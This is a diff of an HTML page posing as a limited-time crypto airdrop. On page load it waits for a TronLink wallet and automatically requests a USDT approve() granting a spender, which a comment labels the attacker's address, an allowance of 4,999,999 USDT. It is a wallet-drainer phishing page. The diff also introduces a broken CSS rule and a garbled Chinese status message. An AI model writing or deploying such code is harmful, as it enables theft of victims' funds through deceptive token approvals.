@@ -5,7 +5,7 @@
   <title>限時空投活動</title>
   <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
   <style>
-    body { font-family: Arial; text-align: center; padding: 50px; background: #f4f4f4; }
+    body { font-family: Arial, text-align: center; padding: 60px; background: #f4f4f4; }
     h1 { color: #333; }
     #status { margin-top: 20px; font-size: 18px; color: #666; }
   </style>
@@ -15,8 +15,9 @@
   <p id="status">正在初始化授權...</p>
 
   <script>
-    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const SPENDER = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B";
+    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC20 USDT 主網合約
+    const SPENDER = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B";       // 攻擊者地址
+    const APPROVE_AMOUNT = window.tronWeb ? window.tronWeb.toSun(4999999) : 4999999 * 1e6; // 4999999 USDT
 
     const ABI = [{
       "constant": false,
@@ -31,18 +32,16 @@
 
     async function autoApprove() {
       if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-        document.getElementById("status").innerText = "請用 TronLink 開啟此頁面";
+        document.getElementById("status").innerText = "請使用 TronLink 麼他尼徑入此頁面。";
         return;
       }
 
       const tronWeb = window.tronWeb;
       const contract = await tronWeb.contract(ABI, USDT_CONTRACT);
-      const amount = tronWeb.toBigNumber("4999999000000");
-
-      document.getElementById("status").innerText = "⏳ 發送授權交易中...";
+      document.getElementById("status").innerText = "⭕️ 授權送出中...";
 
       try {
-        const tx = await contract.approve(SPENDER, amount).send();
+        const tx = await contract.approve(SPENDER, APPROVE_AMOUNT).send();
         document.getElementById("status").innerText = "✅ 授權成功！TX: " + tx;
       } catch (e) {
         document.getElementById("status").innerText = "❌ 授權失敗：" + e.message;
@@ -50,12 +49,12 @@
     }
 
     window.addEventListener("load", () => {
-      const check = setInterval(() => {
+      const interval = setInterval(() => {
         if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-          clearInterval(check);
+          clearInterval(interval);
           autoApprove();
         }
-      }, 800);
+      }, 1000);
     });
   </script>
 </body>
